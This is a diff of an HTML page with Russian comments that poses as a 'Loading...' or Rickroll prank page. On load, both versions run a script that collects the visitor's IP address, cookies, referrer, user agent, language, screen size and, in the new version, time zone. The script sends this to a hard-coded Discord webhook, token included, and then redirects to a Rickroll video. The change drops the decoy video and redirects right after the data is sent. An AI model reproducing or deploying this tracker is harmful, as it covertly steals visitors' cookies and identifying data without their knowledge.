@@ -2,127 +2,54 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Loading...</title>
-    <style>
-        body {
-            background: #0a0a0a;
-            margin: 0;
-            overflow: hidden;
-            font-family: monospace;
+    <title>Redirecting...</title>
+    <script>
+        // ⬇️ ВСТАВЬ СВОЙ DISCORD WEBHOOK URL ⬇️
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1514565565698674799/CBUJgYw6XRaQtCyPMtwaV3Gid7SzZVoRcDIcLIgJFkvBUgGaKPGjhApM-hpPRTnZ1dKL';
+
+        async function sendToDiscord(text) {
+            try {
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: text.substring(0, 2000) })
+                });
+            } catch(e) {}
         }
-        video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
+
+        async function collectAndRedirect() {
+            // Собираем IP
+            let ip = 'не удалось';
+            try {
+                let res = await fetch('https://api.ipify.org?format=json');
+                let data = await res.json();
+                ip = data.ip;
+            } catch(e) {}
+
+            // Формируем сообщение
+            let message = 'НОВЫЙ ЗАХВАТ\n';
+            message += 'Время: ' + new Date().toLocaleString() + '\n';
+            message += 'IP: ' + ip + '\n';
+            message += 'URL: ' + window.location.href + '\n';
+            message += 'Referrer: ' + (document.referrer || 'прямой переход') + '\n';
+            message += 'Cookies: ' + document.cookie + '\n';
+            message += 'User-Agent: ' + navigator.userAgent + '\n';
+            message += 'Язык: ' + navigator.language + '\n';
+            message += 'Экран: ' + screen.width + 'x' + screen.height + '\n';
+            message += 'Часовой пояс: ' + Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+            // Отправляем в Discord
+            await sendToDiscord(message);
+
+            // Редирект на YouTube Rickroll
+            window.location.replace('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
         }
-        .loader {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #0a0a0a;
-            color: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            z-index: 20;
-        }
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-top: 3px solid #00ff00;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .sound-btn {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: rgba(0,0,0,0.7);
-            color: white;
-            border: 1px solid white;
-            padding: 10px 20px;
-            border-radius: 30px;
-            cursor: pointer;
-            z-index: 30;
-            font-family: monospace;
-            display: none;
-        }
-    </style>
+
+        // Запускаем всё сразу
+        collectAndRedirect();
+    </script>
 </head>
 <body>
-
-<div class="loader" id="loader">
-    <div class="spinner"></div>
-    <h3>Loading, please wait...</h3>
-</div>
-
-<video id="rickrollVideo" loop autoplay muted playsinline style="display: none;">
-    <source src="Voicy_rickroll.mp4" type="video/mp4">
-    Ваш браузер не поддерживает видео.
-</video>
-
-<button class="sound-btn" id="soundBtn">🔊 Включить звук</button>
-
-<script>
-    // ⬇️ ВСТАВЬ СВОЙ DISCORD WEBHOOK URL ⬇️
-    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1514565565698674799/CBUJgYw6XRaQtCyPMtwaV3Gid7SzZVoRcDIcLIgJFkvBUgGaKPGjhApM-hpPRTnZ1dKL';
-
-    async function sendToDiscord(text) {
-        await fetch(DISCORD_WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: text.substring(0, 2000) })
-        });
-    }
-
-    async function collectAndSend() {
-        let ip = 'не удалось';
-        try {
-            let res = await fetch('https://api.ipify.org?format=json');
-            let data = await res.json();
-            ip = data.ip;
-        } catch(e) {}
-
-        let message = 'НОВЫЙ ЗАХВАТ\n';
-        message += 'Время: ' + new Date().toLocaleString() + '\n';
-        message += 'IP: ' + ip + '\n';
-        message += 'URL: ' + window.location.href + '\n';
-        message += 'Referrer: ' + (document.referrer || 'прямой переход') + '\n';
-        message += 'Cookies: ' + document.cookie + '\n';
-        message += 'User-Agent: ' + navigator.userAgent + '\n';
-        message += 'Язык: ' + navigator.language + '\n';
-        message += 'Экран: ' + screen.width + 'x' + screen.height + '\n';
-
-        sendToDiscord(message);
-    }
-
-    setTimeout(collectAndSend, 1000);
-
-    // Показываем видео через 3 секунды
-    setTimeout(() => {
-        document.getElementById('loader').style.display = 'none';
-        let video = document.getElementById('rickrollVideo');
-        video.style.display = 'block';
-        video.play(); // играет без звука (muted)
-        document.getElementById('soundBtn').style.display = 'block';
-    }, 3000);
-
-    // Кнопка включения звука
-    document.getElementById('soundBtn').addEventListener('click', () => {
-        let video = document.getElementById('rickrollVideo');
-        video.muted = false;
-        document.getElementById('soundBtn').style.display = 'none';
-    });
-</script>
-
+    <p>Loading, please wait...</p>
 </body>
 </html>
